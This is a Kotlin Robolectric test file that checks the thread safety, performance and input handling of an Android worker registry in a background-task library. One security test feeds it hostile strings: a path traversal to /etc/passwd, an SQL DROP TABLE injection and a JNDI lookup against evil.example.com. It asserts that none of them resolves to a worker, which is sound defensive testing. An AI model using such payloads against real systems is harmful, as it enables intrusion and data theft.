package dev.brewkits.kmpworkmanager

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import dev.brewkits.kmpworkmanager.background.domain.AndroidWorker
import dev.brewkits.kmpworkmanager.background.domain.AndroidWorkerFactory
import dev.brewkits.kmpworkmanager.background.domain.TaskEventManager
import dev.brewkits.kmpworkmanager.background.domain.WorkerEnvironment
import dev.brewkits.kmpworkmanager.background.domain.WorkerFactory
import dev.brewkits.kmpworkmanager.background.domain.WorkerResult
import dev.brewkits.kmpworkmanager.utils.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import org.junit.After
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertSame
import kotlin.test.assertTrue
import kotlin.time.measureTime

/**
 * Android counterpart to `V330RegistryHardeningTest`, covering the concurrency,
 * performance and security axes for `AndroidServiceRegistry` (discussion #66).
 *
 * The Android registry uses double-checked locking rather than the iOS compare-and-set,
 * so the race characteristics differ enough to be worth pinning independently.
 */
@RunWith(RobolectricTestRunner::class)
class V330AndroidRegistryHardeningTest {

    private class NoopWorker : AndroidWorker {
        override suspend fun doWork(input: String?, env: WorkerEnvironment): WorkerResult =
            WorkerResult.Success()
    }

    private class TestAndroidWorkerFactory : AndroidWorkerFactory {
        override fun createWorker(workerClassName: String): AndroidWorker? =
            if (workerClassName == "NoopWorker") NoopWorker() else null
    }

    private val context: Context get() = ApplicationProvider.getApplicationContext()

    // Keep init/shutdown loops from flooding the test log; see the iOS counterpart.
    private val quiet = KmpWorkManagerConfig(logLevel = Logger.Level.ERROR)

    @Before
    fun setUp() = reset()

    @After
    fun tearDown() = reset()

    private fun reset() {
        KmpWorkManager.shutdown()
        TaskEventManager.resetForTest()
        KmpWorkManagerRuntime.reset()
    }

    // ── Concurrency / stress ────────────────────────────────────────────────────

    @Test
    fun `stress - concurrent initialize calls elect exactly one registry`() = runBlocking {
        withContext(Dispatchers.Default) {
            (1..32).map {
                async {
                    KmpWorkManager.initialize(
                        context = context,
                        workerFactory = TestAndroidWorkerFactory(),
                        config = quiet
                    )
                }
            }.awaitAll()
        }

        assertTrue(KmpWorkManager.isInitialized())
        val store = KmpWorkManager.getInstance().eventStore
        assertSame(
            store,
            TaskEventManager.currentStoreForTest(),
            "Exactly one registry must win, and it must be the one wired globally"
        )
        repeat(200) { assertSame(store, KmpWorkManager.getInstance().eventStore) }
    }

    @Test
    fun `stress - concurrent readers never observe a partially built registry`() = runBlocking {
        KmpWorkManager.initialize(context = context, workerFactory = TestAndroidWorkerFactory(), config = quiet)
        val expected = KmpWorkManager.getInstance().eventStore

        withContext(Dispatchers.Default) {
            val readers = (1..64).map {
                async {
                    repeat(50) { assertSame(expected, KmpWorkManager.getInstance().eventStore) }
                    true
                }
            }
            assertTrue(readers.awaitAll().all { it })
        }
    }

    @Test
    fun `stress - repeated init-shutdown cycles do not leak global registrations`() {
        repeat(50) {
            KmpWorkManager.initialize(context = context, workerFactory = TestAndroidWorkerFactory(), config = quiet)
            assertNotNull(KmpWorkManagerRuntime.executionHistoryStore)
            assertNotNull(TaskEventManager.currentStoreForTest())

            KmpWorkManager.shutdown()
            assertNull(KmpWorkManagerRuntime.executionHistoryStore)
            assertNull(TaskEventManager.currentStoreForTest())
            assertFalse(KmpWorkManager.isInitialized())
        }
    }

    // ── Performance ─────────────────────────────────────────────────────────────

    @Test
    fun `performance - initialize is cheap enough for Application onCreate`() {
        // Threshold is loose on purpose: it catches "init started doing disk I/O",
        // not microsecond drift. Android's init also touches WorkManager and the
        // cacheDir sweep, so it is allowed more headroom than iOS.
        val elapsed = measureTime {
            repeat(20) {
                KmpWorkManager.initialize(
                    context = context,
                    workerFactory = TestAndroidWorkerFactory(),
                    config = quiet
                )
                KmpWorkManager.shutdown()
            }
        }
        assertTrue(
            elapsed.inWholeMilliseconds < 5_000,
            "20 init/shutdown cycles took ${elapsed.inWholeMilliseconds}ms — initialize() " +
                "should not be doing heavy eager work on the startup path"
        )
    }

    @Test
    fun `performance - resolved services are cached not rebuilt per access`() {
        KmpWorkManager.initialize(context = context, workerFactory = TestAndroidWorkerFactory(), config = quiet)
        KmpWorkManager.getInstance().eventStore // warm the lazy

        val elapsed = measureTime {
            repeat(100_000) { KmpWorkManager.getInstance().eventStore }
        }
        assertTrue(
            elapsed.inWholeMilliseconds < 2_000,
            "100k cached lookups took ${elapsed.inWholeMilliseconds}ms — the registry is " +
                "rebuilding instead of caching"
        )
    }

    // ── Security-relevant input handling ────────────────────────────────────────

    @Test
    fun `security - hostile worker class names resolve to null`() {
        val factory = TestAndroidWorkerFactory()
        listOf(
            "../../etc/passwd",
            "NoopWorker Evil",
            "'; DROP TABLE workers; --",
            "\${jndi:ldap://evil.example.com/a}",
            "",
            " ".repeat(10_000)
        ).forEach { name ->
            assertNull(
                factory.createWorker(name),
                "Factory must not resolve a worker for hostile input: '$name'"
            )
        }
    }

    @Test
    fun `security - a non-Android factory fails at the registry boundary`() {
        class NotAnAndroidFactory : WorkerFactory {
            override fun createWorker(workerClassName: String) = null
        }

        // Android defers the type check to first resolution (unlike iOS, which rejects
        // eagerly) because WorkManager may never need the typed factory. It must still
        // fail loudly rather than hand back a wrongly-typed object.
        KmpWorkManager.initialize(context = context, workerFactory = NotAnAndroidFactory())
        assertFailsWith<IllegalStateException> {
            KmpWorkManagerAndroid.requireRegistry().androidWorkerFactory
        }
    }

    // ── Integration ─────────────────────────────────────────────────────────────

    @Test
    fun `integration - config values propagate to the runtime container`() {
        val config = KmpWorkManagerConfig(
            logLevel = Logger.Level.ERROR,
            minBatteryLevelPercent = 42
        )
        KmpWorkManager.initialize(
            context = context,
            workerFactory = TestAndroidWorkerFactory(),
            config = config
        )

        assertEquals(
            42,
            KmpWorkManagerRuntime.minBatteryLevelPercent,
            "initialize() must forward config to KmpWorkManagerRuntime, as the Koin module did"
        )
    }

    @Test
    fun `integration - registry hands back the exact factory instance passed in`() {
        val factory = TestAndroidWorkerFactory()
        KmpWorkManager.initialize(context = context, workerFactory = factory)

        assertSame(factory, KmpWorkManagerAndroid.requireRegistry().androidWorkerFactory)
        assertSame(factory, KmpWorkManagerAndroid.requireRegistry().workerFactory)
    }
}
